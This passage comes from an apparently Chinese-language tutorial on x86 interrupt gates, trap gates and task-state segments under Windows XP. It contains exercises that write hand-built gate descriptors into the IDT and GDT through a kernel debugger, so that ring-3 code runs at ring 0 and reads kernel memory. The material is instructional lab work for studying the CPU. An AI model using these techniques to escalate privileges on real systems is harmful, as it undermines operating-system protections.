<li>调用门提权时push了四个寄存器：EIP(返回地址) CS ESP SS，返回时用RETF指令返回。中断门提权时push了五个寄存器：EIP(返回地址) CS EFLAGS ESP SS，返回时用IRETD指令返回。</li>
</ol>
<h3 id="1-3-练习：使用中断门"><a href="#1-3-练习：使用中断门" class="headerlink" title="1.3 练习：使用中断门"></a>1.3 练习：使用中断门</h3><p>题目：构造中断门读高2G的内存，并观察在3环、0环的EFALG寄存器的变化。           </p>
<p>定义一个裸函数，在里面读取一下IDT表的一个值，以证明自己的CPL是0。</p>
<ol>
<li><p>观察IDT表，找一个P&#x3D;0的来构造中断门描述符。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/coIKEfAemaHibOx.png" alt="60.png"></p>
<p>该项在IDT表的下标为32，则中断可构造：int 32</p>
</li>
<li><p>根据中断门描述符结构，构造一个中断门描述符去查找GDT表。$EIP &#x3D; Interrupt-Segment-Selector.Offset ⊕ GDT-Descriptor.Base$</p>
<p>初步构造：</p>
<ul>
<li>偏移：0000 0000</li>
<li>P&#x3D;1</li>
<li>DPL&#x3D;11（<strong>DPL&#x3D;CPL&#x3D;3&gt;CS.DPL&#x3D;0</strong>）</li>
<li>S&#x3D;0</li>
<li>Type&#x3D;1110&#x3D;0xE</li>
<li>中断门无参数</li>
<li>段选择子：<ul>
<li>RPL&#x3D;00&#x2F;11，随意（比较CPL、DPL）</li>
<li>TI&#x3D;0</li>
<li>Index&#x3D;1</li>
<li>00001 0 00&#x3D;0x08，00001 0 11&#x3D;0x0B</li>
</ul>
</li>
<li>0000<strong>EE</strong>00&#96;<strong>0008</strong>0000或者0000<strong>EE</strong>00·<strong>000B</strong>0000</li>
</ul>
</li>
<li><p>根据代码构造中断门描述符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE IDTItem0[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// R0函数，读取了IDT表第一项</span></span><br><span class="line"><span class="comment">// 00401020</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3  调试用的</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">      </span><br><span class="line">		mov eax,<span class="number">0x8003f400</span></span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x4</span>]</span><br><span class="line">		mov dword ptr ds:[IDTItem0],ebx</span><br><span class="line">		mov dword ptr ds:[IDTItem0+<span class="number">0x4</span>],ecx</span><br><span class="line">      </span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd <span class="comment">// iret 会蓝屏，因为 iret的硬编码是66CF，32位下应该使用iretd，硬编码是CF</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x %08x\n&quot;</span>, *(PDWORD)IDTItem0, *(PDWORD)((PBYTE)IDTItem0+<span class="number">0x4</span>));</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/19/EMwfZOh2Irg4Nic.png" alt="62.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/e6sihXKDp3QGNTv.png" alt="63.png"></p>
<p>则中断门描述符为：0040<strong>EE</strong>00&#96;00081020或者0040<strong>EE</strong>00·000B1020。</p>
<p>观察到此时：EFLAG寄存器<mark class="label success">ELF=0x216</mark>。</p>
</li>
<li><p>将中断门描述符写入到IDT表。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/5KDQ8BUb9V6IuL7.png" alt="64.png"></p>
</li>
<li><p>回到XP的VC6中在裸函数代码第一行加个<code>int 3</code>方便查看此时0环的堆栈情况。（需要重新编译查看裸函数的入口地址，如果改变需要修改IDT表的第32项），F5执行如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/AvOWkP6g5otylMn.png" alt="65.png"></p>
<p>此时，堆栈中比提权调用门多一个3环的EFLAG寄存器。且EFLAG0&#x3D;0x16，EFLAG3&#x3D;0x216，对比看得出结论：<strong>中断门在0环将IF位置0了</strong>。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/W2NGfvQeyqrXz6a.png" alt="66.png"></p>
</li>
</ol>
<h3 id="1-4-练习：RETF返回中断门"><a href="#1-4-练习：RETF返回中断门" class="headerlink" title="1.4 练习：RETF返回中断门"></a>1.4 练习：RETF返回中断门</h3><p>中断门提权进0环的堆栈如下右图：</p>
<p><img data-src="https://s2.loli.net/2022/01/28/a4ObrEtMexYh9jB.png" alt="96.png"></p>
<p>相比于调用门多压入一个EFLAG3寄存器，在中断门中用RETF返回，只需将[ESP0+0x8]写到EFLAG3，然后让ESP3和SS3向低地址移动4字节即可。</p>
<ol>
<li><p>构造代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE IDTItem0[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// R0 函数，读取了IDT表第一项</span></span><br><span class="line"><span class="comment">// 004113A0</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3 // 调试用的</span></span><br><span class="line">		pushad	<span class="comment">//esp - 0x20</span></span><br><span class="line">		mov eax,<span class="number">0x8003f400</span></span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x4</span>]</span><br><span class="line">		mov dword ptr ds:[IDTItem0],ebx</span><br><span class="line">		mov dword ptr ds:[IDTItem0+<span class="number">0x4</span>],ecx</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 要求用 retf 返回</span></span><br><span class="line">		add esp,<span class="number">0x28</span>		<span class="comment">// esp0指向eflags3</span></span><br><span class="line">		popfd        		<span class="comment">// esp0+4,esp0指向3环esp3</span></span><br><span class="line">		mov eax,[esp]		<span class="comment">// 将原ESP3和SS3向低地址移动4字节</span></span><br><span class="line">		mov [esp<span class="number">-0x4</span>],eax</span><br><span class="line">		mov eax,[esp+<span class="number">0x4</span>]</span><br><span class="line">		mov [esp],eax</span><br><span class="line"></span><br><span class="line">		sub esp,<span class="number">0x2C</span></span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		INT <span class="number">32</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x %08x\n&quot;</span>, *(PDWORD)IDTItem0, *(PDWORD)((PBYTE)IDTItem0+<span class="number">0x4</span>));</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造中断门描述符，0040<strong>EE</strong>00&#96;<strong>0008</strong>1020。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/sHeCgjGdhwzL7AT.png" alt="68.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/49TgfJz12dV5nBs.png" alt="69.png"></p>
</li>
<li><p>修改IDT表的中断向量为32的那项。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/zwhEdBC4TrA58mc.png" alt="70.png"></p>
</li>
<li><p>回到XP中取消断点后F5执行结果如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/B1OgRvws6YV5UxZ.png" alt="67.png"></p>
</li>
</ol>
<h3 id="1-5-练习：IRETD返回调用门"><a href="#1-5-练习：IRETD返回调用门" class="headerlink" title="1.5 练习：IRETD返回调用门"></a>1.5 练习：IRETD返回调用门</h3><p>iretd返回会弹出5个值（EIP、CS3、EFLAG3、ESP3、SS3），但是retf返回仅4个值（EIP、CS3、ESP3、SS3）</p>
<p>故使用IRETD返回调用门时只需要：<strong>将ESP和SS向高地址移动4字节，将EFLAG写到[ESP+0x8]即可</strong>。</p>
<div class="note primary"><p>这样能成功的原因：调用门提权时并不会将EFLAG的IF清零，所以在0环执行代码的时候将EFLAG压栈不会产生错误。</p>
</div>

<p>调用门（无参数）：</p>
<p><img data-src="https://s2.loli.net/2022/01/28/vrpX1AEgCufyYmZ.png" alt="95.png"></p>
<ol>
<li><p>构造代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad	<span class="comment">//esp - 0x20</span></span><br><span class="line">		pushfd	<span class="comment">//esp - 0x24</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">		mov eax,<span class="number">0x8003f008</span></span><br><span class="line">		mov eax,[eax]</span><br><span class="line">		mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 要求用 iretd 返回		</span></span><br><span class="line">		add esp,<span class="number">0x30</span>		<span class="comment">// esp指向ss</span></span><br><span class="line">		</span><br><span class="line">		mov eax,[esp]		<span class="comment">// 将原ESP和SS向高地址移动4字节</span></span><br><span class="line">		mov [esp+<span class="number">0x4</span>],eax</span><br><span class="line">		mov eax,[esp<span class="number">-0x4</span>]</span><br><span class="line">		mov [esp],eax</span><br><span class="line">		pushfd</span><br><span class="line">		sub esp,<span class="number">0x2c</span>		<span class="comment">// 还原esp</span></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		iretd</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>,dwHigh2GValue);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造调用门描述符，0040<strong>EC</strong>00&#96;00081020。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/TcpPXawbqGzRsnL.png" alt="71.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/8PmKfdbjVOSloGy.png" alt="72.png"></p>
</li>
<li><p>修改GDT表对应的项，eq 8003f048 0040EC00&#96;00081020。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/VOaDjYPcKv4HGIs.png" alt="73.png"></p>
</li>
<li><p>回到XP中取消断点后F5执行，如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/JuxN7iwqeFSXKI8.png" alt="74.png"></p>
</li>
</ol>
<h2 id="2-陷阱门"><a href="#2-陷阱门" class="headerlink" title="2 陷阱门"></a>2 陷阱门</h2><p>陷阱门和中断门除了以下区别，在使用上没什么区别。</p>
<ul>
<li><strong>TYPE</strong>域（32位）<ul>
<li>中断门：Type&#x3D;0x111<strong>0</strong>&#x3D;0xE。</li>
<li>陷阱门：Type&#x3D;0x111<strong>1</strong>&#x3D;0xF。</li>
</ul>
</li>
<li><strong>IF</strong>位是否清零（进入0环后）<ul>
<li>中断门：IF清零</li>
<li>陷阱门：IF不清零</li>
</ul>
</li>
</ul>
<p>使用陷阱门同样会压栈5个参数，应该说<mark class="label danger">通过INT N进入0环都会压栈5个参数</mark>。Windows不使用陷阱门（但是我们可以构造，因为CPU支持）。</p>
<p>陷阱门结构如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/20/5ZEvXOJG67YAIzC.png" alt="75.png"></p>
<ul>
<li>D&#x3D;0，16位陷阱门</li>
<li>D&#x3D;1，32位陷阱门</li>
</ul>
<p>中断门：<strong>高四字节的的第8位 &#x3D; 0</strong>；</p>
<p>陷阱门：<strong>高四字节的的第8位 &#x3D; 1</strong>。</p>
<p>CPU 必须支持中断，中断分为可屏蔽中断和不可屏蔽中断。</p>
<p>中断是基于硬件的，鼠标，键盘是可屏蔽中断，电源属于不可屏蔽中断。当我们拔掉电源之后,CPU并不是直接熄灭的，而是有电容的，此时不管你eflags的IF位是什么，都会执行<code>int 2</code>中断，来进行一些收尾的动作。</p>
<p>中断是可以进行软件模拟的，称为软中断。 也就是通过 <strong>int n</strong> 来进行模拟。 我们构造的中断门，并且进行<code>int n</code>模拟就是模拟了一次软中断。</p>
<div class="note info"><ol>
<li>GDT表中没有调用门描述符，IDT表中没有陷阱门描述符。</li>
<li>Windows不使用<strong>调用门</strong>和<strong>陷阱门</strong>。</li>
</ol>
</div>

<h2 id="3-任务段"><a href="#3-任务段" class="headerlink" title="3 任务段"></a>3 任务段</h2><div class="note primary"><p>在调用门、中断门与陷阱门中，一旦出现权限切换，那么就会有堆栈的切换。而且，由于CS的CPL发生改变，也导致了SS也必须要切换。切换时，会有新的ESP0和SS0（CS是由中断门或者调用门指定）这2个值是从TSS来的。</p>
</div>

<p>执行流程：3环CALL<strong>任务段选择子</strong> --&gt; 根据段选择子到GDT找到对应任务段描述符 --&gt; 将任务段描述符加载到TR寄存器，同时根据任务段中的Base找到TSS内存块的起始地址 --&gt; 根据TSS中的EIP去执行代码 --&gt; IRETD返回。</p>
<h3 id="3-1-TSS结构及作用"><a href="#3-1-TSS结构及作用" class="headerlink" title="3.1 TSS结构及作用"></a>3.1 TSS结构及作用</h3><p>TSS(Task-state segment )，任务状态段。是一块内存，大小为104字节，其中存的是一堆寄存器的值。一个任务对应一块TSS。</p>
<p>32位的TSS结构图如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/20/y3UogsCh7piWzId.png" alt="76.png"></p>
<p>用结构体可以表示为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TSS</span> &#123;</span></span><br><span class="line">    DWORD link; <span class="comment">// 保存前一个 TSS 段选择子，使用 call 指令切换寄存器的时候由CPU填写。</span></span><br><span class="line">    <span class="comment">// 这 6 个值是固定不变的，用于提权，CPU 切换栈的时候用</span></span><br><span class="line">    DWORD esp0; <span class="comment">// 保存 0 环栈指针</span></span><br><span class="line">    DWORD ss0;  <span class="comment">// 保存 0 环栈段选择子</span></span><br><span class="line">    DWORD esp1; <span class="comment">// 保存 1 环栈指针</span></span><br><span class="line">    DWORD ss1;  <span class="comment">// 保存 1 环栈段选择子</span></span><br><span class="line">    DWORD esp2; <span class="comment">// 保存 2 环栈指针</span></span><br><span class="line">    DWORD ss2;  <span class="comment">// 保存 2 环栈段选择子</span></span><br><span class="line">    <span class="comment">// 下面这些都是用来做切换寄存器值用的，切换寄存器的时候由CPU自动填写。</span></span><br><span class="line">    DWORD cr3; </span><br><span class="line">    DWORD eip;  </span><br><span class="line">    DWORD eflags;</span><br><span class="line">    DWORD eax;</span><br><span class="line">    DWORD ecx;</span><br><span class="line">    DWORD edx;</span><br><span class="line">    DWORD ebx;</span><br><span class="line">    DWORD esp;</span><br><span class="line">    DWORD ebp;</span><br><span class="line">    DWORD esi;</span><br><span class="line">    DWORD edi;</span><br><span class="line">    DWORD es;</span><br><span class="line">    DWORD cs;</span><br><span class="line">    DWORD ss;</span><br><span class="line">    DWORD ds;</span><br><span class="line">    DWORD fs;</span><br><span class="line">    DWORD gs;</span><br><span class="line">    DWORD ldt_selector;<span class="comment">//ldt段选择子,用于换ldtr寄存器，一个TSS对应一个LDT表，就算你有100个任务，那么ldtr寄存器里</span></span><br><span class="line">  			<span class="comment">//面存储的也是当前ldt表，也就是任务切换时，LDT表会切换，但GDT表不会切换</span></span><br><span class="line">    <span class="comment">// 这个暂时忽略</span></span><br><span class="line">    DWORD io_map;</span><br><span class="line">&#125; TSS;</span><br></pre></td></tr></table></figure>

<p>低地址中的ESP0，SS0用于从3环堆栈到0环堆栈。切换CR3等于切换进程。</p>
<p>Intel的设计TSS初衷是：切换任务（站在CPU的角度来说，<strong>操作系统中的线程可以称为任务</strong>）。CPU考虑到操作系统的线程在执行的时候会不停的切换，所以设计了TSS，让任务可以来回的切换。</p>
<p><strong>但是操作系统并没有采用该方法切换线程(Windows、Linux都没有这样做)。</strong>Windows仅使用了TSS中的ESP0、SS0。</p>
<blockquote>
<p>对TSS作用的理解应该仅限于存储寄存器即可，跟任务(线程)切换没有关系。TSS的意义就在于可以<strong>同时换掉”一堆”寄存器</strong>。</p>
</blockquote>
<div class="note warning"><ol>
<li>TSS是一块104字节内存，通过TR寄存器找到这块内存，TR寄存器的Base指向这块内存，Limit为这块内存的大小，TR的值来自GDT表的TSS段描述符。</li>
<li>CPU中的一个任务对应一块TSS内存，任务切换时TSS也会跟着切换，TSS是跟随任务的一个链表，如32位TSS的低4字节就指向<strong>前一个TSS段描述符的段选择子</strong>。</li>
<li>TSS替换寄存器的过程：<strong>3环代码CALL&#x2F;JMPTR使用段选择子触发TSS段描述符，然后将段描述符加载到TR寄存器，根据TR的Base找到TSS内存块，将内存块的值加载到其结构包涵的所有寄存器中，然后执行TSS中的EIP，该EIP是从TSS段内存块中来的</strong>。</li>
</ol>
</div>

<p><strong>关于TSS结构中的LDT Segment Selector成员：</strong></p>
<ol>
<li>该成员是LDTR段寄存器的可见16位部分（段选择子）。</li>
<li>LDT段选择子去查LDT表，根据LDT表中对应的段描述符装载此时的LDTR寄存器。</li>
<li>LDTR段寄存器的Base指向LDT表，Limit为LDT表大小。 </li>
<li>一个LDTR寄存器的值对应于当前任务，一个任务一张LDT表。</li>
<li>Windows没有使用LDT表和LDTR寄存器。</li>
</ol>
<h3 id="3-2-TSS、TR读写"><a href="#3-2-TSS、TR读写" class="headerlink" title="3.2 TSS、TR读写"></a>3.2 TSS、TR读写</h3><p><strong>TSS替换寄存器的过程</strong>：3环代码CALL&#x2F;JMP使用TR段选择子触发TSS段描述符，然后将段描述符加载到TR寄存器，根据TR的Base找到TSS内存块，将内存块的值加载到其结构包涵的所有寄存器中。过程如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/22/9k8cHTDjOZtn46q.png" alt="78.png"></p>
<p>TSS段描述符结构如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
<div class="note default"><p>TSS段描述符中：</p>
<ul>
<li>Type域<ul>
<li>高四字节的第9位是一个判断位，如果此时该TSS段描述符<strong>已经被加载到TR寄存器中</strong>，那么该位为<mark class="label danger">1</mark>，16进制下为B。</li>
<li>如果该TSS段描述符<strong>没有被加载到TR寄存器中</strong>，那么该位为<mark class="label danger">0</mark>，16进制下为9。</li>
</ul>
</li>
<li>G位<ul>
<li>G&#x3D;0，说明<strong>寻址按字节来</strong>（TSS用）</li>
<li>G&#x3D;1，说明寻址按4kb来（页）</li>
</ul>
</li>
</ul>
</div>

<p><strong>TR寄存器读写</strong></p>
<p>（1）写TR寄存器：将TSS段描述符加载到TR寄存器，使用指令：<strong>LTR</strong></p>
<p>有几点需要注意：</p>
<ul>
<li><p>用LTR指令去装载的话 仅仅是改变TR寄存器的值(96位) ，并没有真正改变TSS。</p>
</li>
<li><p>LTR指令只能在系统层使用。(当前CPU权限必须是0环的)</p>
</li>
<li><p>加载后TSS段描述符会状态位会发生改变。(高四字节的第9位发生变化)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov ax,SelectorTSS</span><br><span class="line">ltr ax</span><br></pre></td></tr></table></figure>

<p>执行该指令，从GDT表取TSS描述符填充TR寄存器，但并不会修改其他寄存器。<br>执行指令后，T<strong>SS描述符TYPE域低2位会置1</strong>。</p>
</li>
</ul>
<p>（2）读TR寄存器：使用指令：<strong>STR</strong></p>
<ul>
<li><p>如果用STR去读的话，只读了TR的16位也就是段选择子。这跟读取CS段寄存器一样，读取16位。（读16位写96位）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">str ax</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>注意：</strong></p>
<p>使用<code>LTR</code>仅能在0环权限下修改TR段寄存器，但是并不会改变TSS的值，<mark class="label danger">要想同时改变TR寄存器和TSS的值</mark>，可以在Ring3下使用CALL FAR、JMP FAR指令来修改。（在Intel手册第二卷有关于Call的三种用法介绍：段内调用、远调用、任务段调用）</p>
<h3 id="3-3-CALL、JMP访问任务段的区别"><a href="#3-3-CALL、JMP访问任务段的区别" class="headerlink" title="3.3 CALL、JMP访问任务段的区别"></a>3.3 CALL、JMP访问任务段的区别</h3><div class="note success"><ol>
<li>调用时的区别</li>
</ol>
<ul>
<li><p><strong>CALL FAR</strong>：EFLAGS 的 NT位置1，会修改TSS previous task link，属于任务嵌套。</p>
</li>
<li><p><strong>JMP FAR</strong>：  NT位&#x3D;0，不会修改TSS previous task link，不属于任务嵌套。</p>
</li>
</ul>
<ol start="2">
<li>使用<code>iretd</code>返回时的区别：<strong>CPU根据NT位决定返回方式，NT位影响iretd</strong></li>
</ol>
<ul>
<li>如果NT&#x3D;1，CPU使用TSS的 Previous task link 里存储的上一个任务的TSS选择子进行返回（<strong>是上一个TSS段选择子，里面保存的EIP即为返回地址</strong>）<mark class="label warning">任务返回</mark></li>
<li>如果NT&#x3D;0，则使用堆栈中的值返回（<mark class="label warning">中断返回</mark>）</li>
</ul>
</div>

<p><img data-src="https://s2.loli.net/2021/12/19/ySQIR7D1LpUgh3v.png" alt="58.png"></p>
<p>关于在我们自己的代码中使用<code>int 3</code>，函数在执行到该指令无法正常返回时蓝屏的解释（int 3在0环做的两件事）？（<strong>目前还不清楚具体原因</strong>）</p>
<ol>
<li>修改FS段寄存器</li>
<li>将NT位置0</li>
</ol>
<p><strong>但是在使用int 3后，恢复上述两种任何一个值都可以正常返回</strong>。</p>
<h3 id="3-4-练习：使用CALL调用任务段修改所有寄存器"><a href="#3-4-练习：使用CALL调用任务段修改所有寄存器" class="headerlink" title="3.4 练习：使用CALL调用任务段修改所有寄存器"></a>3.4 练习：使用CALL调用任务段修改所有寄存器</h3><p>使用CALL FAR实现用TSS替换寄存器。</p>
<p><strong>CALL FAR</strong>：EFLAGS 的 NT位置1，会修改TSS previous task link</p>
<p>大体流程为：</p>
<ol>
<li>准备一个104字节的TSS，并附上正确的值。</li>
<li>准备一个自己写的TSS段描述符，写入到GDT表的一个空白的位置。</li>
<li>修改TR寄存器（CALL FAR，JMP FAR）。</li>
<li>注意TSS中的EIP，该EIP是从TSS内存块中来的。</li>
</ol>
<p>TSS可以使用数组，也可以<code>VirtualAlloc</code>，建议后者，因为<strong>TSS最好是页对齐的</strong>。</p>
<ol>
<li><p>准备TSS。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link 由CPU自己填充，表示上一个任务TR的选择子</span></span><br><span class="line">TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>准备TSS段描述符并写入GDT表P&#x3D;0的位置，XX00E9XX &#96;XXXX0068，X为申请的104字节内存的首地址。</p>
<ul>
<li>G位为0，单位是字节</li>
<li><strong>TSS一开始的类型是9（可用），当加载到TR中就会变成B（ 正被占用）</strong></li>
</ul>
</li>
<li><p>完整代码如下。需要注意：</p>
<ul>
<li>程序运行时需要修改CR3的值，使用<code>!process 0 0</code></li>
<li>TSS中的EIP为即将要执行的函数的入口地址</li>
<li>TSS中的ESP为即将要执行的函数的堆栈地址，但是堆栈是往低地址使用，所以需要给ESP赋值一个已经申请预留的堆栈中的一个相对较高的地址</li>
<li>IO位图、GS、LDT Windows已经没有使用了（win7没用IO位图）</li>
</ul>
